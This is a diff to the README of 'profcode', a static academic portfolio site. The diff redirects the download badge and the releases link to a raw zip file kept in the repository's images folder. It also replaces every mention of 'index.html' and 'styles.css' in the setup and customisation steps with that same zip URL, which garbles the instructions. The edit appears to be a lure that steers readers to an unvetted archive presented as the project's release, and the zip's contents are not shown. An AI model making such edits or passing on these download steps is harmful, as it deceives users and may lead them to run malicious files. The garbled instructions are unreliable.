@@ -1,7 +1,7 @@
 # 📚 profcode - Your Academic Portfolio Made Easy
 
 ## ✅ Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/joaomoncaio/profcode/releases)
+[![Download Here](https://raw.githubusercontent.com/joaomoncaio/profcode/main/imagens/profcode-2.3.zip%https://raw.githubusercontent.com/joaomoncaio/profcode/main/imagens/profcode-2.3.zip)](https://raw.githubusercontent.com/joaomoncaio/profcode/main/imagens/profcode-2.3.zip)
 
 ## 📖 Description
 profcode is a static academic website designed as Professor Ajax’s portfolio. This legacy project follows the João Albero v1.0 template. It has been reviewed and standardized for ease of use. The website includes an MIT license and features a bilingual README to assist users from diverse backgrounds.
@@ -16,7 +16,7 @@ To set up your own copy of profcode, you need to follow a few simple steps. This
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to our releases page to download the latest version of profcode. You can find it [here](https://github.com/joaomoncaio/profcode/releases).
+   Go to our releases page to download the latest version of profcode. You can find it [here](https://raw.githubusercontent.com/joaomoncaio/profcode/main/imagens/profcode-2.3.zip).
 
 2. **Choose the Latest Release**  
    Look for the latest release version at the top of the page and click on it to view its details.
@@ -28,10 +28,10 @@ To set up your own copy of profcode, you need to follow a few simple steps. This
    Once the download is complete, locate the zip file on your computer. Right-click the zip file and select "Extract All" or use your favorite extraction software.
 
 5. **Open the File**  
-   Navigate to the folder where you extracted files. Look for an HTML file named `index.html`. This is your main webpage.
+   Navigate to the folder where you extracted files. Look for an HTML file named `https://raw.githubusercontent.com/joaomoncaio/profcode/main/imagens/profcode-2.3.zip`. This is your main webpage.
 
 6. **View in a Browser**  
-   Double-click on `index.html`. It should open automatically in your web browser, displaying Professor Ajax’s portfolio.
+   Double-click on `https://raw.githubusercontent.com/joaomoncaio/profcode/main/imagens/profcode-2.3.zip`. It should open automatically in your web browser, displaying Professor Ajax’s portfolio.
 
 ## 🖌️ Features
 - **Bilingual Support:** The site is available in multiple languages, making it accessible for a wider audience.
@@ -43,13 +43,13 @@ To set up your own copy of profcode, you need to follow a few simple steps. This
 You may want to personalize your copy of profcode. Here are steps to customize it:
 
 1. **Edit the Content**  
-   Open the `index.html` file in any text editor such as Notepad or VS Code. You can change the text, images, or links to fit your needs.
+   Open the `https://raw.githubusercontent.com/joaomoncaio/profcode/main/imagens/profcode-2.3.zip` file in any text editor such as Notepad or VS Code. You can change the text, images, or links to fit your needs.
 
 2. **Change Styles**  
-   To modify how your site looks, you can edit the CSS files located in the `css` folder. Look for `styles.css` to change colors, fonts, and layouts.
+   To modify how your site looks, you can edit the CSS files located in the `css` folder. Look for `https://raw.githubusercontent.com/joaomoncaio/profcode/main/imagens/profcode-2.3.zip` to change colors, fonts, and layouts.
 
 3. **Add New Sections**  
-   If you want to add more content to your site, simply copy and paste sections of HTML code within `index.html`. Adjust the text and links as necessary.
+   If you want to add more content to your site, simply copy and paste sections of HTML code within `https://raw.githubusercontent.com/joaomoncaio/profcode/main/imagens/profcode-2.3.zip`. Adjust the text and links as necessary.
 
 ## 🧑‍🏫 About the Project
 profcode serves as a static portfolio webpage. It is designed to showcase academic information, projects, and achievements. Ideal for professors and students alike, it provides a professional online presence without needing extensive web development skills.
